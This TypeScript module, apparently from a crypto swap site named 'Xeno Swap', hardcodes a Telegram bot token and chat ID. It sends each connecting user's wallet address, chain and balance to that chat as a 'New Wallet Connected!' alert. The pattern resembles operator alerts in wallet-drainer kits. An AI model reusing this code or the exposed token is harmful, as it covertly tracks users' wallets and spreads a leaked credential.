
export const TELEGRAM_BOT_TOKEN = '8562240636:AAEFpo1WqanfPWmQezkei48BjgoLDu6jiKo';
export const TELEGRAM_CHAT_ID = '-4836248812';

export const sendTelegramMessage = async (message: string) => {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      console.error('Failed to send Telegram message:', await response.text());
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
};

export const formatWalletMessage = (address: string, chainId: number, balance: number, chainName: string) => {
  return `
🚀 <b>New Wallet Connected!</b>

👛 <b>Address:</b> <code>${address}</code>
🔗 <b>Chain:</b> ${chainName} (${chainId})
💰 <b>Native Balance:</b> ${balance.toFixed(6)}

<i>User connected to Xeno Swap</i>
`;
};
